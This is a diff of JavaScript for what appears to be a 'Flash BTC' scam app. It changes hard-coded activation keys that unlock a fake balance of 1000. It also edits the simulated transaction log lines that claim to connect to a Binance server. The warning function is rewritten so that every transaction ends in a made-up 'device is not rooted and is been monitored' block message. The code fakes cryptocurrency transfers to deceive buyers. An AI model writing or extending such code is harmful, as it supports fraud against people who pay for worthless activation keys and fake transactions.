@@ -438,7 +438,7 @@ function activateSoftwareAlert3() {
   container.style.pointerEvents =  "none"
   navShowHelp.style.display = "none"
   notificationHeadP.textContent = "Flash BTC Activation"
-  notificationBodyP.textContent = "Activation Successful"
+  notificationBodyP.textContent = "Activation Successfull"
 }
 
 function onlinAlert() {
@@ -454,16 +454,8 @@ function onlinAlert() {
 activateSoftwareBtn.onclick = ()=> {
   if(activationInput.value == "") {
     activateSoftwareAlert2()
-  } else if(activationInput.value == "flashbtc9GY72849") {
+  } else if(activationInput.value == "flashbtc9ksu83jjx") {
     localStorage.setItem('activated', true)
-    localStorage.setItem('warning', true)
-    activateSoftwareAlert3()
-    Balance.textContent = 1000
-    tryDemoId.style.display = "none"
-    transactionID.style.display = "block"
-  } else if(activationInput.value == "flashbtc9GY7011") {
-    localStorage.setItem('activated', true)
-    localStorage.setItem('warning', false)
     activateSoftwareAlert3()
     Balance.textContent = 1000
     tryDemoId.style.display = "none"
@@ -754,7 +746,7 @@ function demoRun () {
       container.style.pointerEvents =  "none"
       navShowHelp.style.display = "none"
       notificationHeadP.textContent = "Flash BTC"
-      notificationBodyP.textContent = "Invaild amount or gas fee error, try again"
+      notificationBodyP.textContent = "Invaild amount, verify and try again"
     }, 2000)
     } else {
       let arr = ["[INFO] Initializing transaction", "[INFO] Verfiying parameters", "[INFO] Verifying wallet address...", "[INFO] Fetching transaction details...", "[INFO] Sending from Minning_287.86.35.94-binance-server.com-33-p#", "[INFO] Connecting to Binance Server...",
@@ -872,17 +864,8 @@ refreshBtn.onclick = ()=> {
 }
 
 function warning() {
-  if(localStorage.getItem('warning') == true) {
-    notificationHeadP.textContent = "Flash BTC Blocked"
-    notificationBodyP.textContent = 'Transaction Failed, Device is not rooted and is been monitored'
-    let warning = document.getElementById('warning');
-    warning.style.display = 'flex';
-  } else if (localStorage.getItem('warning') == false) {
-    notificationHeadP.textContent = "Flash BTC Blocked"
-    notificationBodyP.textContent = 'Gas fee error'
-  } else {
-    
-  }
+  let warning = document.getElementById('warning');
+  warning.style.display = 'flex';
 }
 
 createAnewTransaction.onclick = ()=> {
@@ -919,7 +902,7 @@ createAnewTransaction.onclick = ()=> {
       container.style.pointerEvents =  "none"
       navShowHelp.style.display = "none"
       notificationHeadP.textContent = "Flash BTC"
-      notificationBodyP.textContent = "Invaild amount or gas fee error, try again"
+      notificationBodyP.textContent = "Invaild amount, verify and try again"
     }, 2000)
     } else if(localStorage.getItem('activated')) {
       transactionID.innerText = ""
@@ -958,9 +941,8 @@ createAnewTransaction.onclick = ()=> {
      notificationContainer.style.display = "flex"
      container.style.pointerEvents =  "none"
      navShowHelp.style.display = "none"
-     //i removed them and moved it to the warning()
-    //  notificationHeadP.textContent = "Flash BTC Blocked"
-    //  notificationBodyP.textContent = 'Transaction Failed, Device is not rooted and is been monitored'
+     notificationHeadP.textContent = "Flash BTC Blocked"
+     notificationBodyP.textContent = 'Transaction Failed, Device is not rooted and is been monitored'
      warning()
      setTimeout(() => {
       // Construct the URL for the explorer page
